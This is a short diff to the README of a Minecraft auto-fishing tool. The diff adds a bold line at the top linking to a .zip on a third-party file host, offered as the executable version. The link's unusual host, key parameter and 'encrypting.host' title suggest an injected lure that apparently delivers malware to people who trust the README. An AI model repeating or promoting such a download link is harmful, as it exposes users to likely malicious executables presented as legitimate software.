@@ -1,3 +1,5 @@
+**Click [here](https://i.uwu.plus/e/dkwRLPbsqE.zip?key=RbubuALxFahLHK&color=ffffff&title=encrypting.host) to download the executable (.exe) version.**    
+
 # Auto Fisher for Minecraft
 This Auto fisher is made for automatic fishing in minecraft.  
 It scans the area around the crosshair.   
